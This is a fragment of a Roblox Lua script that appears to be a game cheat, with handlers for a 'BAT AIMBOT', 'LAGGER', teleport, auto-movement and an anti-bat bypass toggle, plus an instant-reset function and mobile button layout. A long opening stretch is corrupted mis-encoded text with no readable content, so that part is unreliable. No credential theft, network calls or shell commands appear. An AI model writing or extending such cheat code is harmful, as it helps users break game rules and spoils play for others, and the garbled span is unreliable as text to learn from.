Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â antiBatBypassEnabled pasti false setelah ini
    _batV2ForceStop()
    task.defer(function() _batV2HookChar(char) end)
end)

-- Hook karakter yang sudah ada sekarang (exec pertama kali)
if LP.Character then
    task.defer(function() _batV2HookChar(LP.Character) end)
end
-- ===== END BAT V2 Auto-stop =====

-- ==================== END BAT V2 ====================



-- ==================== INSTANT RESET ====================
local _instaResetBusy = false
local function instaResetRun()
    if _instaResetBusy then return end
    local char = LP.Character
    local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not root then return end
    _instaResetBusy = true
    pcall(function()
        if hum then
            hum.BreakJointsOnDeath = true
            hum.PlatformStand = true
            hum:ChangeState(Enum.HumanoidStateType.Physics)
        end
        root.AssemblyAngularVelocity = Vector3.zero
        root.AssemblyLinearVelocity = Vector3.new(0, 1000000, 0)
    end)
    task.delay(0.5, function() _instaResetBusy = false end)
end
_G.SoundInstaResetRun = instaResetRun
-- ==================== END INSTANT RESET ====================

local defaults = {
-- Original positions:
-- AUTO LEFT above DROP BR | AUTO RIGHT above AIMBOT
-- LAGGER under TP / CARRY
autoLeft     = UDim2.new(1, -132, 0.5, -161),
autoRight    = UDim2.new(1, -66,  0.5, -161),
drop         = UDim2.new(1, -132, 0.5, -95),
aimbot       = UDim2.new(1, -66,  0.5, -95),
tp           = UDim2.new(1, -132, 0.5, -29),
carry        = UDim2.new(1, -66,  0.5, -29),
laggerNormal = UDim2.new(1, -132, 0.5, 37),
laggerCarry  = UDim2.new(1, -66,  0.5, 37),
tpBat        = UDim2.new(1, -198, 0.5, -95),
instantReset = UDim2.new(1, -198, 0.5, -161),
batV2        = UDim2.new(1, -198, 0.5, -29),
}

function _G.SoundResetMobileButtons()
_G.SoundMobileButtonScale = SoundAutoMobile and 0.90 or 1.00
_G.SoundMobileButtonImage = ""
_G.SoundHideMobileButtons = false
_G.SoundMobileButtonShape = "ROUNDED"
_G.SoundMobileButtonPositions = {}
_G.SoundHiddenMobileButtons = {}
_G.SoundMobileLayoutV = 6
for key, defaultPos in pairs(defaults) do
local entry = mobileButtons[key]
local holder = entry and entry.holder
if holder then
holder.Position = defaultPos
end
end
_G.SoundApplyMobileButtonSize()
_G.SoundApplyMobileButtonsHidden()
_G.SoundApplyMobileButtonVisibility()
if _G.SoundRefreshButtonVisibilityRows then pcall(_G.SoundRefreshButtonVisibilityRows) end
_G.SoundApplyMobileButtonShape()
_G.SoundApplyMobileButtonImage()
_G.SoundApplyMobileButtonShape()
if type(saveSoundConfig) == "function" then pcall(saveSoundConfig) end
end

makeButton("drop", "DROP BR", defaults.drop, function(btn)
if runDropBrainrot then runDropBrainrot() elseif runDrop then runDrop() end
pulse(btn)
end)

makeButton("autoLeft", "AUTO\nLEFT", defaults.autoLeft, function()
if _G.SoundSetAutoLeft then _G.SoundSetAutoLeft(not autoLeftEnabled) end
end)

makeButton("aimbot", "BAT\nAIMBOT", defaults.aimbot, function(btn)
if _G.SoundSafeModeIsLocked and _G.SoundSafeModeIsLocked() then return end
selectedAimbotMode = "Normal"
